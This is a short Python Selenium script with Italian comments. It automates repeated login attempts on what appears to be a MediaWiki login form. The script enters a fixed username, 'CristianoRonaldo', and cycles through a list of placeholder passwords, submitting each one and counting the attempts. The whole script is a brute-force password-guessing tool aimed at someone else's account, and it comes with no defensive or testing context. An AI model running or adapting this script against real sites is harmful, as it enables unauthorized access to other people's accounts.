from selenium import webdriver
from selenium.webdriver.common.by import By

lista_parole = ["parola1", "parola2", "parola3", "parola4", "parola5", "parola6", "parola7", "parola8", "parola9", "parola10"]

# Inizializza il driver del browser (per esempio, Chrome)
driver = webdriver.Chrome()

# Apri la pagina web
url = ""
driver.get(url)

# Effettua il clic sul link con l'ID "pt-login"
login_link = driver.find_element(By.ID, "pt-login")
login_link.click()

# Trova l'elemento del campo di input per il nome utente utilizzando l'ID
username_field = driver.find_element(By.ID, "wpName1")
username_field.send_keys("CristianoRonaldo")

# Itera attraverso la lista delle password
c = 1
for password in lista_parole:
    # Trova l'elemento del campo di input per la password utilizzando l'ID
    password_field = driver.find_element(By.ID, "wpPassword1")
    password_field.clear()  # Pulisci il campo di input precedente
    password_field.send_keys(password)
    print("Tentativo", c)
    c = c+1

    # Trova il pulsante di login utilizzando l'ID e fai clic su di esso
    login_button = driver.find_element(By.ID, "wpLoginAttempt")
    login_button.click()

    # Effettua qui le operazioni successive una volta eseguito il login

# Attendi l'input dell'utente prima di continuare
input("Premi invio per procedere con la prossima password...")

# Chiudi il browser
driver.quit()